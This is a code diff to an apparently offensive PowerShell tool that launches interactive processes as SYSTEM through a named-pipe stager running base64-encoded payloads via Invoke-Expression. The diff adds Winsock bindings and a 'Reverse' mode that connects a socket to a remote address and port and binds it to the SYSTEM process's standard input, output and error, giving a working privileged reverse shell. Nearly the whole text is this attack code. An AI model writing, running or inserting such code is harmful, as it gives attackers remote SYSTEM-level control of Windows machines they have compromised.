@@ -209,8 +209,51 @@ $InvokeInteractiveProcess_ScriptBlock = {
                 ref UInt32 pCount
             );
 
+            [DllImport("Ws2_32.dll", SetLastError = true)]
+            public static extern int WSAStartup(ushort wVersionRequested, IntPtr lpWSAData);
+
             [DllImport("wtsapi32.dll")]
             public static extern void WTSFreeMemory(IntPtr pMemory);
+        }
+
+        public static class WS232
+        {
+            [DllImport("Ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int WSAStartup(
+                ushort wVersionRequested,
+                IntPtr lpWSAData
+            );
+
+            [DllImport("Ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int WSACleanup();
+
+            [DllImport("ws2_32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern IntPtr WSASocket(
+                int af,
+                int type,
+                int protocol,
+                IntPtr lpProtocolInfo,
+                int g,
+                int dwFlags
+            );
+
+            [DllImport("ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int WSAConnect(
+                IntPtr s,
+                IntPtr name,
+                int namelen,
+                IntPtr lpCallerData,
+                IntPtr lpCalleeData,
+                IntPtr lpSQOS,
+                IntPtr lpGQOS
+            );
+
+            [DllImport("ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int closesocket(IntPtr s);
         }
 "@
 
@@ -265,17 +308,145 @@ $InvokeInteractiveProcess_ScriptBlock = {
         return $activeSessionId
     }
 
+    function Initialize-NativeSocket
+    {
+        $WSAData = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(408)
+        if ([WS232]::WSAStartup(0x2020, $WSAData))
+        {
+            throw [WinAPIException]::New("WSAStartup")
+        }
+
+        return $WSAData
+    }
+
+    function Clear-NativeSocket
+    {
+        $null = [WS232]::WSACleanup()
+    }
+
+    function New-NativeSocket
+    {
+        $AF_INET = 2
+        $SOCK_STREAM = 1
+        $IPPROTO_TCP = 6
+
+        $socket = [WS232]::WSASocket($AF_INET, $SOCK_STREAM, $IPPROTO_TCP, [IntPtr]::Zero, 0, 0)
+        if ($socket -eq [IntPtr]::Zero)
+        {
+            throw [WinAPIException]::New("WSASocket")
+        }
+
+        return $socket
+    }
+
+    function Close-NativeSocket
+    {
+        param (
+            [IntPtr] $Socket
+        )
+
+        if ([int]$Socket -le 0)
+        {
+            return
+        }
+
+        if ([WS232]::closesocket($Socket))
+        {
+            throw [WinAPIException]::New("closesocket")
+        }
+
+    }
+
+    function Connect-NativeSocket
+    {
+        param (
+            [Parameter(Mandatory=$True)]
+            [string] $Address,
+
+            [Parameter(Mandatory=$True)]
+            [ValidateRange(1, 65535)]
+            [int] $Port
+        )
+
+        $sockAddrPtr = [IntPtr]::Zero
+        $socket = -1
+        try
+        {
+            $socket = New-NativeSocket
+
+            # This tiny hack is used to avoid defining by hand `SockAddr` native structure.
+            $ipEndPoint = [System.Net.IPEndPoint]::New(
+                [System.Net.IPAddress]::Parse($Address),
+                $Port
+            )
+
+            $sockAddr = $ipEndPoint.Serialize()
+
+            $sockAddrPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sockAddr.Size)
+
+            for ($i = 0; $i -lt $sockAddr.Size; $i++) {
+                [System.Runtime.InteropServices.Marshal]::WriteByte($sockAddrPtr, $i, $sockAddr[$i])
+            }
+
+            $result = [WS232]::WSAConnect(
+                $socket,
+                $sockAddrPtr,
+                $sockAddr.Size,
+                [IntPtr]::Zero,
+                [IntPtr]::Zero,
+                [IntPtr]::Zero,
+                [IntPtr]::Zero
+            )
+            if ($result -eq -1)
+            {
+                throw [WinAPIException]::New("WSAConnect")
+            }
+        }
+        catch
+        {
+            Close-NativeSocket -Socket $socket
+
+            $socket = -1
+        }
+        finally
+        {
+            if ($sockAddrPtr -ne [IntPtr]::Zero)
+            {
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($sockAddrPtr)
+            }
+        }
+
+        return $socket
+    }
+
     function Invoke-InteractiveSystemProcess
     {
         param(
             [string] $CommandLine = "powershell.exe",
+            [switch] $Hide,
 
-            [switch] $Hide
+            [ValidateSet("None", "Reverse")]
+            [string] $RedirectKind = "None",
+
+            [string] $Address = "127.0.0.1",
+
+            [ValidateRange(1, 65535)]
+            [int] $Port = 2801
         )
 
         if (-not [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
         {
             return
+        }
+
+        $redirectFd = $false
+        if ($RedirectKind -eq "Reverse")
+        {
+            Initialize-NativeSocket
+
+            $socket = Connect-NativeSocket -Address $Address -Port $Port
+
+            $redirectFd = $true
         }
 
         $newToken = [IntPtr]::Zero
@@ -313,6 +484,7 @@ $InvokeInteractiveProcess_ScriptBlock = {
                 throw [WinAPIException]::New("SetTokenInformation")
             }
 
+            $STARTF_USESTDHANDLES = 0x100
             $STARTF_USESHOWWINDOW = 0x1
             $SW_SHOW = 0x5
             $SW_HIDE = 0x0
@@ -323,6 +495,9 @@ $InvokeInteractiveProcess_ScriptBlock = {
                 $STARTUPINFO_structSize = 0x68
                 $STARTUPINFO_dwFlags = 0x3c
                 $STARTUPINFO_wShowWindow = 0x40
+                $STARTUPINFO_StdInput = 0x50
+                $STARTUPINFO_StdOutput = 0x58
+                $STARTUPINFO_StdError = 0x60
 
                 # PROCESS_INFORMATION x64
                 $PROCESS_INFORMATION_structSize = 0x18
@@ -335,6 +510,9 @@ $InvokeInteractiveProcess_ScriptBlock = {
                 $STARTUPINFO_structSize = 0x44
                 $STARTUPINFO_dwFlags = 0x2c
                 $STARTUPINFO_wShowWindow = 0x30
+                $STARTUPINFO_StdInput = 0x38
+                $STARTUPINFO_StdOutput = 0x3c
+                $STARTUPINFO_StdError = 0x40
 
                 # PROCESS_INFORMATION x32
                 $PROCESS_INFORMATION_structSize = 0x10
@@ -356,10 +534,16 @@ $InvokeInteractiveProcess_ScriptBlock = {
                     $STARTUPINFO_structSize
                 )
 
+                $dwFlags = $STARTF_USESHOWWINDOW
+                if ($redirectFd)
+                {
+                    $dwFlags = $dwFlags -bor $STARTF_USESTDHANDLES
+                }
+
                 [System.Runtime.InteropServices.Marshal]::WriteInt32(
                     $pSTARTUPINFO,
                     $STARTUPINFO_dwFlags,
-                    $STARTF_USESHOWWINDOW -bor $STARTF_USESTDHANDLES
+                    $dwFlags
                 )
 
                 [System.Runtime.InteropServices.Marshal]::WriteInt16(
@@ -367,6 +551,28 @@ $InvokeInteractiveProcess_ScriptBlock = {
                     $STARTUPINFO_wShowWindow,
                     $(if ($Hide) {$SW_HIDE} else {$SW_SHOW})
                 )
+
+                # Redirect Standard I/O
+                if ($redirectFd)
+                {
+                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
+                        $pSTARTUPINFO,
+                        $STARTUPINFO_StdInput,
+                        $socket
+                    )
+
+                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
+                        $pSTARTUPINFO,
+                        $STARTUPINFO_StdOutput,
+                        $socket
+                    )
+
+                    [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
+                        $pSTARTUPINFO,
+                        $STARTUPINFO_StdError,
+                        $socket
+                    )
+                }
 
                 # Start new process as SYSTEM (Interactive Session)
                 $CREATE_NEW_CONSOLE = 0x10
@@ -377,7 +583,7 @@ $InvokeInteractiveProcess_ScriptBlock = {
                     $CommandLine,
                     [IntPtr]::Zero,
                     [IntPtr]::Zero,
-                    $false,
+                    $(if ($redirectFd -eq $true) { $true } else { $false }),
                     $CREATE_NEW_CONSOLE,
                     [IntPtr]::Zero,
                     [IntPtr]::Zero,
@@ -408,7 +614,14 @@ $InvokeInteractiveProcess_ScriptBlock = {
                 $null = [Kernel32]::CloseHandle($hThread)
                 $null = [Kernel32]::CloseHandle($hProcess)
 
-                return [string]::Format("Success: New process launched with process id: '{0}'", $processId)
+                if ($processId -gt -1 -and $redirectFd)
+                {
+                    Wait-Process -Id $processId
+
+                    Close-NativeSocket -Socket $socket
+                }
+
+                return $processId
             }
             finally
             {
@@ -418,7 +631,7 @@ $InvokeInteractiveProcess_ScriptBlock = {
         }
         catch
         {
-            return "Error: " + $_.Exception.Message
+            return -1
         }
         finally
         {
@@ -717,29 +930,39 @@ function Invoke-InteractiveSystemProcess
     #>
     param (
         [string] $CommandLine = "powershell.exe",
-        [switch] $Hide
+        [switch] $Hide,
+
+        [ValidateSet("None", "Reverse")]
+        [string] $RedirectKind = "None",
+
+        # Depending on the RedirectKind, the following parameter is whether the address of remote server
+        # or the interface to bind to.
+        [string] $Address,
+
+        [ValidateRange(1, 65535)]
+        [int] $Port
     )
 
     $stager_ScriptBlock = {
         try
         {
-            $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", "PIPENAME", [System.IO.Pipes.PipeDirection]::InOut)
+            $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", "PIPENAME", [System.IO.Pipes.PipeDirection]::In)
 
             $pipeClient.Connect(5 * 1000)
 
             $reader = New-Object System.IO.StreamReader($pipeClient)
 
-            $writer = New-Object System.IO.StreamWriter($pipeClient)
-            $writer.AutoFlush = $true
-
             $nextStage = $reader.ReadLine()
 
-            $result = Invoke-Expression([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($nextStage)))
-
-            $writer.WriteLine($result)
+            Invoke-Expression([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($nextStage)))
         }
         finally
         {
+            if ($reader)
+            {
+                $reader.Close()
+            }
+
             if ($pipeClient)
             {
                 $pipeClient.Dispose()
@@ -764,34 +987,58 @@ function Invoke-InteractiveSystemProcess
 
     try
     {
-        $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut)
+        $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
 
         $pipeServer.WaitForConnection()
 
         $writer = New-Object System.IO.StreamWriter($pipeServer)
         $writer.AutoFlush = $true
 
-        $reader = New-Object System.IO.StreamReader($pipeServer)
+        # Prepare optional arguments
+        $optionalArgs = @()
+
+        if ($Hide)
+        {
+            $optionalArgs += "-Hide"
+        }
+
+        if ($RedirectKind -ne "None")
+        {
+            $optionalArgs += "-RedirectKind $RedirectKind"
+
+            if ($Address)
+            {
+                $optionalArgs += "-Address $Address"
+            }
+
+            if ($Port)
+            {
+                $optionalArgs += "-Port $Port"
+            }
+        }
 
         # Create our final payload that will be executed in the context of the SYSTEM user
         $payload = $InvokeInteractiveProcess_ScriptBlock.ToString() +
-        $WinAPIException_ScriptBlock.ToString() +
-        $InvokeZeroMemory_ScriptBlock.ToString() +
-        [string]::Format(
-            "Invoke-InteractiveSystemProcess -CommandLine ""{0}"" {1}",
-            $CommandLine,
-            $(if ($Hide) {"-Hide"} else {""})
-        )
+            $WinAPIException_ScriptBlock.ToString() +
+            $InvokeZeroMemory_ScriptBlock.ToString() +
+            [string]::Format(
+                "Invoke-InteractiveSystemProcess -CommandLine ""{0}"" {1}",
+                $CommandLine,
+                # Forward optional arguments
+                ($optionalArgs -join " ")
+            )
 
         $encoded_payload = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($payload))
 
         $writer.WriteLine($encoded_payload)
-
-        # Display remote process task(s) output
-        Write-Host ($reader.ReadLine())
     }
     finally
     {
+        if ($writer)
+        {
+            $writer.Close()
+        }
+
         if ($pipeServer)
         {
             $pipeServer.Dispose()
